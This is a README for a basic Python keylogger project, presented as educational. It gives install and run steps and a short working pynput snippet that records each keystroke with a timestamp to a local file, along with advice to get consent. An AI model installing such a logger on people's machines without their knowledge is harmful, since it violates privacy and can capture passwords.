# Simple Keylogger in Python

## Overview
This project is a basic keylogger developed in Python. It logs keystrokes along with timestamps and saves them to a text file. This tool is intended for educational purposes only.

## Features
- Logs keystrokes with timestamps.
- Handles special keys (space, enter, backspace).
- Easy to stop with Ctrl+C.

## Installation
1. Ensure you have Python installed on your machine.
2. Install the required library:
   ```bash
   pip install pynput
   ```

## Usage
1. Run the keylogger script:
   ```bash
   python keylogger.py
   ```
2. The keylogger will start capturing keystrokes. Press **Ctrl+C** to stop the logging.

## Ethical Considerations
- Always obtain permission before logging anyone's keystrokes.
- Be transparent about the purpose of data collection.
- Ensure compliance with local laws regarding data privacy.

## Example Code
Here's a snippet of the keylogger code:

```python
import pynput
from pynput.keyboard import Key, Listener
import datetime

log_file = "keylog.txt"

def log_key(key):
    with open(log_file, "a") as f:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{timestamp}: {key}\n")

with Listener(on_press=log_key) as listener:
    listener.join()
```

## License
This project is for educational purposes only. Use it responsibly and ethically.

## Acknowledgments
- [pynput](https://pynput.readthedocs.io/en/latest/) - A library to control and monitor input devices.
